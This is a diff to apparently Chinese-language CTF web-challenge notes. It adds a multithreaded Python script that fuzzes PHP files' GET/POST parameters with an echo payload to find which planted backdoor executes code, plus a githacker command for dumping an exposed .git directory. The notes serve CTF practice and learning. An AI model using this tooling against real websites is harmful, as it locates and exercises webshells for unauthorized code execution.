@@ -61,3 +61,68 @@
 16. php 5 intval特性：[[WUSTCTF2020]朴实无华](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E.md)
 17. githacker基本命令
 - githacker --url http://example.com/.git --output-folder ./output
+
+18. 多文件内寻找可用shell脚本。今天遇见一道题，整个网站全是后门文件，然而只有一个是有用的。算是fuzz题的变种，可以用以下多线程脚本找到。
+
+```php
+import os
+import requests
+import re
+import threading
+import time
+
+print('开始时间： '+ time.asctime(time.localtime(time.time()))) 
+s1 = threading.Semaphore(100)
+filePath = r"src"
+os.chdir(filePath)
+requests.adapters.DEFAULT_RETRIES = 5
+files = os.listdir(filePath)
+session = requests.Session()
+session.keep_alive = False
+def get_content(file):
+    s1.acquire()
+    print('tring  '+file+'   '+time.asctime(time.localtime(time.time())))
+    with open(file,encoding='utf-8') as f:
+        gets = list(re.findall('\$_GET\[\'(.*?)\'\]',f.read()))
+        posts = list(re.findall('\$_POST\[\'(.*?)\'\]',f.read()))
+    data = {}
+    params = {}
+    for m in gets:
+        params[m] = "echo '123456';"
+    for n in posts:
+        data[n] = "echo '123456';"
+    url = "此处填本地网站地址" +file  #远程的也能post和get到，但是不知道为啥fuzz不出来
+    req = session.post(url,data=data,params=params)
+    req.close()
+    req.encoding = 'utf-8'
+    content=req.text
+    if '123456' in content:
+        flag = 0
+        for a in gets:
+            req = session.get(url+'?%s='%a+"echo '123456';")
+            content =req.text
+            req.close()
+            if "123456" in content:
+                flag = 1
+                break
+        if flag != 1:
+            for b in posts:
+                req = session.post(url, data={b:"echo '123456';"})
+                content =req.text
+                req.close()
+                if "123456" in content:
+                    break
+        if flag == 1:
+            params = a
+        else:
+            params = b
+        print('找到了利用文件： ' + file +"  and 找到了利用的参数：%s" %params)
+        print('结束时间： '+time.asctime(time.localtime(time.time())))
+    s1.release()
+
+for i in files:
+    t = threading.Thread(target=get_content,args=(i,))
+    t.start()
+```
+
+题目及来源：[[强网杯 2019]高明的黑客](https://blog.csdn.net/qq_51684648/article/details/120167176)
